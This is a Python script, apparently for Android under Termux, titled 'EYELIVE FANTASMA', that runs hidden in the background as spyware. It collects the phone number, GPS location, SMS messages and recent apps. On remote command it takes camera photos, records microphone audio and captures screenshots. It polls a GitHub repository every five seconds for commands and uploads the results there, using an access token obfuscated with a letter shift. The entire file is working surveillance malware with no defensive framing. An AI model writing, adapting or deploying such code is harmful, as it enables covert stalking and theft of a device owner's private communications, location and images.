#!/usr/bin/env python3
"""EYELIVE FANTASMA - Roda invisível em segundo plano"""
import os, json, time, subprocess, requests as req, base64 as b64, hashlib, threading
from datetime import datetime

def _tk():
    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

TOKEN = _tk()
REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}

# Pegar número do celular automaticamente
def get_phone_number():
    try:
        r = subprocess.check_output("termux-telephony-deviceinfo 2>/dev/null", shell=True, text=True)
        data = json.loads(r)
        return data.get("phone_number", "unknown")
    except:
        return "unknown"

PHONE = get_phone_number()
DEVICE_ID = hashlib.md5(PHONE.encode()).hexdigest()[:12]
print(f"EYELIVE FANTASMA - {PHONE} ({DEVICE_ID})")

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return ""

def coletar_dados():
    """Coleta todos os dados do dispositivo"""
    dados = {
        "id": DEVICE_ID,
        "phone": PHONE,
        "time": datetime.now().strftime("%H:%M:%S"),
        "bateria": "",
        "gps": {},
        "sms": [],
        "apps": [],
        "foto": "",
        "audio": ""
    }
    
    # Bateria
    b = shell("termux-battery-status 2>/dev/null")
    if b:
        try:
            bat = json.loads(b)
            dados["bateria"] = str(bat.get("percentage","?")) + "%"
        except: pass
    
    # GPS
    g = shell("termux-location 2>/dev/null")
    if g:
        try:
            gps = json.loads(g)
            dados["gps"] = {"lat": gps.get("latitude",0), "lng": gps.get("longitude",0)}
        except: pass
    
    # SMS
    s = shell("termux-sms-list -l 5 2>/dev/null")
    if s:
        try: dados["sms"] = json.loads(s)[:5]
        except: pass
    
    # Apps recentes
    a = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
    if a:
        dados["apps"] = [x.strip() for x in a.split('\n') if x.strip()]
    
    return dados

def executar_comando(cmd):
    """Executa um comando específico"""
    if cmd == "foto_frontal":
        path = f"/data/data/com.termux/files/home/eyelive_foto.jpg"
        shell(f"termux-camera-photo -c 0 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "foto_traseira":
        path = f"/data/data/com.termux/files/home/eyelive_foto.jpg"
        shell(f"termux-camera-photo -c 1 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "audio":
        path = "/data/data/com.termux/files/home/eyelive_audio.aac"
        shell(f"termux-microphone-record -f {path} -l 10 -q 2>/dev/null")
        time.sleep(12)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "screenshot":
        path = "/data/data/com.termux/files/home/eyelive_screen.png"
        shell(f"screencap {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f:
                return b64.b64encode(f.read()).decode()
    
    elif cmd == "status":
        return json.dumps(coletar_dados())
    
    return ""

def verificar_comandos():
    """Verifica se há comandos no GitHub"""
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/comandos/{DEVICE_ID}.json"
        r = req.get(url, headers=HEADERS)
        if r.status_code == 200:
            data = r.json()
            comando = json.loads(b64.b64decode(data['content']).decode())
            sha = data['sha']
            
            # Executar comando
            cmd = comando.get("cmd", "status")
            resultado = executar_comando(cmd)
            
            # Salvar resposta
            resposta = {
                "device": DEVICE_ID,
                "phone": PHONE,
                "cmd": cmd,
                "result": resultado,
                "time": datetime.now().strftime("%H:%M:%S")
            }
            
            url_resp = f"https://api.github.com/repos/{REPO}/contents/respostas/{DEVICE_ID}.json"
            c = json.dumps(resposta)
            r2 = req.get(url_resp, headers=HEADERS)
            p = {"message":"Resposta","content":b64.b64encode(c.encode()).decode(),"branch":"main"}
            if r2.status_code == 200: p["sha"] = r2.json()["sha"]
            req.put(url_resp, json=p, headers=HEADERS)
            
            # Deletar comando
            req.delete(url, json={"message":"OK","sha":sha,"branch":"main"}, headers=HEADERS)
            
    except: pass

# Loop principal
print("👻 Modo Fantasma ativado...")
while True:
    verificar_comandos()
    time.sleep(5)
